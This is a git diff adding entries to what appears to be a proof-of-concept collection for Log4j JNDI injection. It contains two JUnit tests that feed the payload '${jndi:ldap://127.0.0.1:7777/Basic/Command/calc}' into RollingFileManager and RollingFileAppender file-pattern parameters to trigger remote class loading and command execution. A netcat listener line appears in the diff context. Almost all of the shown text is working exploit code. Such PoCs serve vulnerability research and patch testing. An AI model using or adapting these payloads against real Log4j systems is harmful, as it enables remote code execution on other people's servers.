@@ -104,6 +104,61 @@ nc -l -p 7777
     }
 ```
 
+**RollingFileManager.getFileManager()**
+```
+    @Test
+    public void getFileManagerRollingFileManagerTest(){
+        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
+        RolloverStrategy strategy = DefaultRolloverStrategy.newBuilder()
+                .withMax(String.valueOf(3))
+                .withConfig(new DefaultConfiguration())
+                .withFileIndex("min")
+                .build();
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+        Configuration config = new DefaultConfiguration();
+
+        // First execute add manager into MAP
+        RollingFileManager.getFileManager(
+                "app.log", "", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);
+
+        // Second call executes updateData from MAP
+        RollingFileManager.getFileManager(
+                "app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);
+
+    }
+```
+
+**RollingFileManager.setTriggerPolicy()**
+
+```
+ @Test
+    public void setTriggerPolicyRollingFileManagerTest(){
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
+                .withFileName("app.log")
+                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+                .setLayout(layout)
+                .withAppend(true)
+                .setName("RollingFile")
+                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "false", "0 * * * * ?"))
+                .withStrategy(DefaultRolloverStrategy.newBuilder()
+                        .withMax(String.valueOf(3))
+                        .withConfig(new DefaultConfiguration())
+                        .withFileIndex("min")
+                        .build())
+                .build();
+
+        appender.getManager().setTriggeringPolicy(OnStartupTriggeringPolicy.createPolicy(1));
+    }
+```
+
 ## Pocs for Context Tree ##
 
 **LogManager.getContext()**
